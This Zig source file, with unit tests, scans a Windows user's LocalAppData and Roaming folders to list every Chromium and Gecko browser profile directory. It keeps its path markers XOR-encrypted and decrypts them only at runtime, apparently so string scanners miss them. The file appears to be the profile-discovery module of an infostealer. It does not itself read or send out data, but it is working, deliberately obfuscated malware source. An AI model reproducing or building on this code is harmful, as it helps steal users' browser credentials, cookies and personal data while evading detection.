const std = @import("std");
const hash = @import("../types/hash.zig");

pub const ScannedBrowser = struct {
    name: []const u8,
    profile_path: []const u8,
    is_chromium: bool,
};

const E = struct {
    pub const chromium_marker = hash.xorEncrypt("User Data\\Local State");
    pub const gecko_marker = hash.xorEncrypt("Profiles\\profiles.ini");
    pub const default_name = hash.xorEncrypt("Default");
    pub const profile_prefix = hash.xorEncrypt("Profile ");
};

fn fileExists(path: []const u8) bool {
    var file = std.fs.openFileAbsolute(path, .{}) catch return false;
    file.close();
    return true;
}

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn findProfiles(base_path: []const u8, browser_name: []const u8, is_chromium: bool, browsers: *std.ArrayList(ScannedBrowser), allocator: std.mem.Allocator) !void {
    var default_buf: [E.default_name.len]u8 = undefined;
    hash.xorDecrypt(&E.default_name, &default_buf);
    const default_str = default_buf[0..];

    var prefix_buf: [E.profile_prefix.len]u8 = undefined;
    hash.xorDecrypt(&E.profile_prefix, &prefix_buf);
    const prefix_str = prefix_buf[0..];

    const default_path = try std.mem.concat(allocator, u8, &[_][]const u8{ base_path, "\\", default_str });
    if (dirExists(default_path)) {
        try browsers.append(ScannedBrowser{
            .name = try allocator.dupe(u8, browser_name),
            .profile_path = default_path,
            .is_chromium = is_chromium,
        });
    } else {
        allocator.free(default_path);
    }

    var i: usize = 1;
    while (true) : (i += 1) {
        var num_buf: [32]u8 = undefined;
        const num_str = std.fmt.bufPrint(&num_buf, "{s}{d}", .{ prefix_str, i }) catch break;
        const profile_path = try std.mem.concat(allocator, u8, &[_][]const u8{ base_path, "\\", num_str });
        if (dirExists(profile_path)) {
            try browsers.append(ScannedBrowser{
                .name = try allocator.dupe(u8, browser_name),
                .profile_path = profile_path,
                .is_chromium = is_chromium,
            });
        } else {
            allocator.free(profile_path);
            break;
        }
    }
}

fn scanDirectory(base: []const u8, marker_rel: []const u8, is_chromium: bool, browsers: *std.ArrayList(ScannedBrowser), allocator: std.mem.Allocator) void {
    var dir = std.fs.openDirAbsolute(base, .{ .iterate = true }) catch return;
    defer dir.close();

    var iter = dir.iterate();
    while (true) {
        const entry_maybe = iter.next() catch break;
        const entry = entry_maybe orelse break;
        if (entry.kind != .directory) continue;

        var check_buf: [4096]u8 = undefined;
        const check_path = std.fmt.bufPrint(&check_buf, "{s}\\{s}\\{s}", .{ base, entry.name, marker_rel }) catch continue;
        if (!fileExists(check_path)) continue;

        const browser_base = std.mem.concat(allocator, u8, &[_][]const u8{ base, "\\", entry.name }) catch continue;
        defer allocator.free(browser_base);

        if (is_chromium) {
            const user_data = std.mem.concat(allocator, u8, &[_][]const u8{ browser_base, "\\User Data" }) catch continue;
            defer allocator.free(user_data);
            findProfiles(user_data, entry.name, true, browsers, allocator) catch {};
        } else {
            findProfiles(browser_base, entry.name, false, browsers, allocator) catch {};
        }
    }
}

pub fn scan(local_app_data: []const u8, roaming_app_data: []const u8, allocator: std.mem.Allocator) ![]ScannedBrowser {
    var browsers = std.ArrayList(ScannedBrowser).init(allocator);
    errdefer {
        for (browsers.items) |b| {
            allocator.free(b.name);
            allocator.free(b.profile_path);
        }
        browsers.deinit();
    }

    var chromium_marker_buf: [E.chromium_marker.len]u8 = undefined;
    hash.xorDecrypt(&E.chromium_marker, &chromium_marker_buf);
    const chromium_marker = chromium_marker_buf[0..];

    var gecko_marker_buf: [E.gecko_marker.len]u8 = undefined;
    hash.xorDecrypt(&E.gecko_marker, &gecko_marker_buf);
    const gecko_marker = gecko_marker_buf[0..];

    scanDirectory(local_app_data, chromium_marker, true, &browsers, allocator);
    scanDirectory(roaming_app_data, gecko_marker, false, &browsers, allocator);

    return browsers.toOwnedSlice();
}

test "scan returns empty for nonexistent local path" {
    const result = try scan("C:\\__nonexistent__local__", "C:\\__nonexistent__roaming__", std.testing.allocator);
    defer {
        for (result) |b| {
            std.testing.allocator.free(b.name);
            std.testing.allocator.free(b.profile_path);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "scan returns empty for empty temp dirs" {
    const tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const local_path = tmp.dir.realpathAlloc(std.testing.allocator, ".") catch return;
    defer std.testing.allocator.free(local_path);
    const result = try scan(local_path, local_path, std.testing.allocator);
    defer {
        for (result) |b| {
            std.testing.allocator.free(b.name);
            std.testing.allocator.free(b.profile_path);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "dirExists returns false for nonexistent path" {
    try std.testing.expect(!dirExists("C:\\__nonexistent__dir__"));
}

test "fileExists returns false for nonexistent path" {
    try std.testing.expect(!fileExists("C:\\__nonexistent__file__"));
}
